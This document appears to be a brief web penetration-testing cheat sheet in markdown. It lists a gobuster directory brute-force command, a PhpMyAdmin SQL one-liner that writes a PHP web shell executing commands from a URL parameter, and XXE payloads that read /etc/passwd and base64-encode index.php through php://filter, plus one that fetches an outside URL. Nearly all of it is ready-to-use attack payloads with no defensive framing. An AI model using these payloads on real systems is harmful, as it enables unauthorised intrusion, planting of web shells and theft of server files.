# Web

- [BruteForce Url](#bruteforce-url)
- [PhpMyAdmin](#phpmyadmin)
- [XML external entity (XXE)](#xml-external-entity-xxe)

## BruteForce Url
### Gobuster
```
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Zap
```
owasp-zap
```

## PhpMyAdmin
### Quick Shellcode
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

## XML external entity (XXE)
### Read File
```
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```